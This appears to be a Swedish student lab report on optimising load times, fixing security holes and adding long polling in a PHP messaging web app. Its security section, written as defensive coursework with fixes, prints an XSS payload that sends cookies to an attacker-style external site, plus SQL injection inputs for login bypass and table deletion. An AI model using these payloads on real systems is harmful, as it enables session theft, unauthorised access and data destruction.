Rapport f�r laboration 2 - 1DV449
Av: Viktor Nilsson

### Laddningstid ###

Det fanns en hel del att g�ra f�r att optimera laddningstiden f�r sidan och dessa samt tiderna efter att f�r�ndringarna gjorts visas h�r nedan.
D� det fr�mst var inloggningen som tog tid gjordes flest tester h�r. Applikationen har under dessa tester k�rs fr�n binero.

Tider f�r inloggningen i sekunder.

Gjort �tg�rd:           1      2      3      4      5     6     7
F�rsta g�ngen: 7050 - 3640 - 6500 - 6320 - 3080 - 3710 - 913 - 1070
Andra g�ngen:  5860 - 2620 - 2230 - 2600 - 2760 -  586 - 112 -  647
Tredje g�ngen: 4270 - 2250 - 2020 - 3100 - 3030 -  424 - 367 -  496

 �tg�rder
 1. Ta bort on�dig location (img/middle.php) + delayen p� 2 sec
 2. Ta bort script som inte finns (longpoll.js) - on�dig + mindre GET, boken
 3. Flytta om s� att check.php k�rs i mess.php f�r att slippa �nnu fler GET, boken
 4. Samla inline-script och css i mess.php och k�ra med externa filer (othercss.css, otherscripts.js)
 5. Tar bort dynamiska cssfilerna fr�n css.php och lagt i othercss.css statiska filer. Kortare laddningstider pga lokal, f�rre GET, boken
 6. Minska bilderna - mindre data att skicka => snabbare (food.jpg)
 7. Minimera storleken p� css- och js-filer.
 
 
 1. Genom att ta bort GET-requests drar vi ner p� laddningstiden s� location's vill vi minimera. Sen tog jag �ven bort fulingen som gjorde att applikationen tog 2 sekunder extra att laddas. Som k�lla till denna �tg�rd tar jag b�de boken och f�rel�sningarna d� vi pratat mycket om att dra ner p� antalet f�rfr�gningar. Laddningstiden blev markant b�ttre fr�mst p� grund av de 2 sekunderna som applikationen pausade.
 2. Scriptet fanns ej och s�g d�rf�r ingen anledning till att ha det med. Detta drog ner p� ytterligare en GET-request �ven fast det nog inte gjorde speciellt mycket �r det en av de sm� b�ckarna. Laddningstiden blev konstig f�rsta g�ngen men andra och tredje visar �nd� p� f�rb�ttring, fr�gan �r dock om det gjorde s� pass mycket som den visar. Samma referens som ovan.
 3. F�r att forts�tta dra ner p� on�diga laddningar omstrukturerade jag lite och flyttade �ver funktionalitet fr�n check.php till mess.php. H�r ser vi att laddningstiden hoppar upp f�rmodligen p� grund av andra faktorer.
 4. Jag beh�ll inline-cssen f�r index.php d� den f�rmodligen bara kommer k�ras en g�ng per session, men inline script och css i mess.php samlade jag ihop till var sin extern fil (othercss.css & otherscripts.js) f�r att kunna cachea detta s� att det g�r snabbare att ladda sidan senare. �ven omstrukturering gjordes i ordningen saker och ting laddades. L�ngst upp laddas css och l�ngst ner script. css ska laddas f�rst f�r att sidan ska kunna renderas snyggt och snabbt, script sist f�r att dessa inte beh�vs f�rr�n sidan renderats och att dom enbart laddas hem en och en. (Boken som referens, Rule 6). H�r ser vi vid f�rsta laddningen en markant skillnad. Det kan vara att bilden var cachead som sp�kade h�r.
 5. Jag vet inte om man fick g�ra s� h�r, men vad jag kunde se fr�n inneh�llet p� de dynamiskt laddade css-filerna grid1 & grid2 fanns d�r inget som var specifikt f�r delar av sidan s� jag valde att spara dessa lokalt ist�llet f�r att snabba upp tiden. (Antar att det l�g n�gon sleep() i denna ocks�). Dessa tog �ver 1 sekund att ladda s� skulle ge en markant skillnad hade jag hoppats p� och det gav det f�rutom f�rsta laddningen som visar helt andra siffror.
 6. En sak jag m�rkte var att food.jpg var enormt stor och d� den inte visades st�rre �n ungef�r 300x220 beh�vde den heller inte vara st�rre d� den inte n�gonstans i applikationen visades st�rre �n detta. H�r hade jag n�r jag gjort skrapan �ndra storleken p� skrapade bilder i php och sparat ner dessa i r�tt storlek f�r att dra ner p� datam�ngen som ska �ver till klienten. H�r ser vi en stor skillnad d� bilden emellan�t tog upp till 2-3 sekunder att ladda ibland.
 7. Som sista grej valde jag att f�rminska storleken p� alla externa resurser (css och js) genom en minifier (http://cssminifier.com/ och http://javascript-minifier.com/). Allt f�r att dra ner p� m�ngen data som ska skickas �ver. Testerna h�r visar att resultaten i f�rra testet kanske inte var helt s� bra som dom visade d� tiderna gick upp trots att jag f�rv�ntade mig dom att g� ner p� grund av datam�ngen minskats med �ver 20-30% totalt p� de externa resursfilerna.
 
 Kommentarer:
 css.php?css=grid1/2 tar v�ldigt oj�mnt med tid under f�rsta testerna vilket gjort vissa tider ej r�ttvisa.
 den stora bilden food.jpg laddas inte alltid trots att cache rensas vilket har st�llt till det i vissa testresultat.
 
 
 
 
### S�kerhet ###

1. Det fanns gott om s�kerhetsh�l i applikationen varav ett var XSS i meddelandef�ltet.
* Man skulle kunna med hj�lp av f�ljande rad kunna skicka iv�g cookieinformation till en extern sida: <script language="JavaScript">document.location="http://minhaxx0rsida.se/sparacookie.php?cookie=" + document.cookie;document.location="http://www.tillbakatillsidan.com"</script>
* Jag fixade till detta genom att k�ra htmlentities p� all data som ska ut.
* Skada som hade kunnat ske �r att n�gon f�r tag p� ens session och kan komma in p� sidan inloggad som dig.

2. Det finns inget skydd mot att highjacka sessioner.
* Man kan om man kommer �t sessionsinformationen (t.ex med en XSS-attack) anv�nda denna f�r att logga in p� sidan.
* Jag fixade detta genom att spara undan b�de IP och useragent som man sedan kollar mot. G�r att manipulera men d� m�ste attackeraren veta b�da IP och useragent.
* Skadan som hade kunnat ske �r samma som ovan; n�gon kan komma in p� sidan inloggad som dig.

3. Mycket h�l f�r SQL-Injections i ajaxanropen. Det jag uppt�ckt �r getMessage, getMessageIdForProducer, getProducer g�r att utnyttja f�r SQL-injections.
* Genom att mata in ' OR '1'='1 Kommer allt att h�mtas hem. Vill man kan man �ven '; DROP TABLE tabellen;--
* Fixas genom antingen att kolla s� att ett ID �r ett tal, intval() brukar jag anv�nda f�r nummer. Att k�ra en prepare() och sen en bindParam() �r vad jag gjort i detta fallet p� samtliga.
* Med en SQL-Injection skulle man kunna komma �ver information fr�n databasen eller f�rst�ra genom att ta bort och manipulera data. �r l�senorden d�ligt krypterade skulle dessa kunna anv�ndas f�r att testa dina inloggningsuppgifter p� andra tj�nster.

4. Det gick att logga in med SQL-injections i inloggningsf�ltet.
* Genom att mata in ' OR '1'='1 i b�da f�lten kommer du loggas in, inte ot�nkbart med adminkonto d� detta ofta registreras f�rst. Vet du anv�ndarnamnet kan du skriva in det och sedan skriva ' OR '1'='1 i l�senordsf�ltet f�r att logga in som den personen.
* Fixas som ovan genom att k�ra prepare() och bindParam().
* G�r att g�ra saker som ovan men �ven att logga in som andra.

5. Mer SQL-injections finns att genomf�ra i meddelandeformul�ret, b�de som namn och meddelande. Detta �r precis som ovan avhj�lpt med prepare() och bindParam() och innefattar samma s�kerhetsrisker som ovan.

6. En s�kerhetsrisk som var enkelt att missa var att vid utloggning blev man inte utloggad utan bara skickad till inloggningssidan. Gick man tillbaka var man fortfarande inloggad. Jag lade till en funktion som gjorde att man loggades ut innan man skickades tillbaka till index.php.
* Risken �r att n�gon annan s�tter sig vid datorn och kan komma �t ditt konto d� du inte loggats ut p� riktigt.
* Ta bort sessions hj�lper i detta fallet f�r att d�da inloggningen.
* F�rbrytaren kan g�ra allt du kan d� den �r inloggad som dig.

### Comet Long Polling ###

Sp�nnande extrauppgift som var riktigt l�rorik! Jag l�ste uppgiften genom att ha en php-fil som efter att den kallas l�gger sig i en loop i best�mt antal sekunder och kollar frekvent mot databasen om ett meddelande med ett nyare ID �n det som skickades till scriptet finns. Om inte forts�tter loopandet, om det d�remot kommit ett meddelande som �r nyare och �verensst�mmer med producer-idet ($pid) retureras detta.

P� klientsidan har jag tagit bort den vanliga koden som l�ste in meddelandena och ersatte med min egna som helt enkelt b�rjar med att kika om det finns n�got meddelande f�r $pid'en som �r st�rre �n vilket det kommer finnas om det finns meddelanden. Detta �ldsta meddelande skickas tillbaka och skrivs ut, samma kod excekveras igen fast denna g�ngen med det nya idet f�r meddelandet. Hittas ett meddelande som �r nyare h�nder samma sak och detta p�g�r till dess att det inte finns n�gra nyare meddelande �n sist laddat meddelande. D� kommer den ist�llet ligga och f�rs�ka ladda scriptet tills dess att den timeoutar. D� tar den upp en ny anslutning och ligger och v�ntar innan antingen den ocks� timeoutar eller att det faktiskt kommer ett nytt meddelande.

Den stora nackdelen �r de v�ldigt m�nga SQL-anrop som sker. Allt f�r att anv�ndaren ska f� en push-aktig upplevelse. PHP �r heller inte gjort f�r att ha denna typ av �ppna anslutningar och vad jag kunnat l�sa mig till s� �r detta v�ldigt resurskr�vande med �ppna anslutningar och php.

Jag lade �ven til en kolumn i sqlite-databasen (timestamp som integer) som h�ller tiden. Med javascript omvandlar jag denna och spottar ut mig ett finare format.
.prepend anv�ndes ist�llet f�r .append f�r att f� meddelandena att hamna i r�tt ordning (senast �verst).

### Slutkommentarer: ###
Ingen energi alls har lagts p� att strukturera upp koden snyggare och med enhetligt. Hade jag haft tid hade jag g�rna f�rs�kt ge mig p� och g�ra denna kod mer objektorienterad och MVC men tid har inte funnits.
Inte heller har jag brytt mig om att kapsla in javascriptsfunktioner och den globala variabeln p� ett snyggare s�tt som vi l�rde oss i webbteknik 1, ocks� detta f�r att prioritera de moment laborationen var till f�r.
Hade jag haft mer tid hade detta ocks� fixats.